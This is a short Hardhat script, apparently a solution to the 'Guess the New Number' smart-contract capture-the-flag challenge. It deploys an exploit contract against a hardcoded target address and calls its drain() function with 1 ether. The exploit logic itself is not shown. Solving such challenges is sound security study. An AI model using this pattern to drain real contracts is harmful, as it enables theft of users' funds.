import { ethers } from 'hardhat'

async function main() {
  const [owner] = await ethers.getSigners()
  const GuessTheNewNumberExploit = await ethers.getContractFactory('GuessTheNewNumberExploit')
  const guessTheNewNumberExploit = await GuessTheNewNumberExploit.deploy('0x1c48498f57e8180f13235C7B40fb3A2B5a36D881')
  await guessTheNewNumberExploit.deployed()

  const guessTheNumberInterface = ['function drain() payable']
  const guessTheNumberContract = await ethers.getContractAt(
    guessTheNumberInterface,
    guessTheNewNumberExploit.address,
    owner
  )

  await guessTheNumberContract.drain({
    value: ethers.utils.parseEther('1.0'),
  })
}

main().catch((error) => {
  console.error(error)
  process.exitCode = 1
})
